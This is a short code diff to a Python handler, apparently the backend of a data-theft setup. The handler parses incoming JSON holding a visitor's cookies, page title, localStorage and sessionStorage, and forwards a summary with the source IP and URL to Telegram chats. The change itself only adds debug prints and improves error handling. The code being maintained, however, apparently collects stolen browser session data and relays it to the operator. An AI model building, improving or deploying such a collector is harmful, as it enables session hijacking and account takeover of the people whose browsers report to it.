@@ -170,6 +170,7 @@ async def notify_telegram_chats(req_id: str, ip: str, ts: str, method: str, url:
         summary = {}
         try:
             data = json.loads(original_json)
+            print(f"Parsed data keys: {list(data.keys())}")
             # Extract key fields
             summary['cookies'] = data.get('cookies', 'none')
             summary['pageTitle'] = data.get('pageTitle', 'unknown')
@@ -178,8 +179,10 @@ async def notify_telegram_chats(req_id: str, ip: str, ts: str, method: str, url:
             ss_count = len(data.get('sessionStorage', {}))
             summary['localStorage'] = f"{ls_count} items" if ls_count else "none"
             summary['sessionStorage'] = f"{ss_count} items" if ss_count else "none"
-        except:
-            summary = {'error': 'Body not JSON'}
+            print(f"Summary: {summary}")
+        except Exception as e:
+            summary = {'error': f'Body not JSON: {str(e)}'}
+            print(f"Parse error: {str(e)}")
 
         # Build a concise message
         msg = f"🆔 {req_id}\n📍 {ip}\n⏱️ {ts}\n📦 {method} {url.split('?')[0][:50]}...\n"
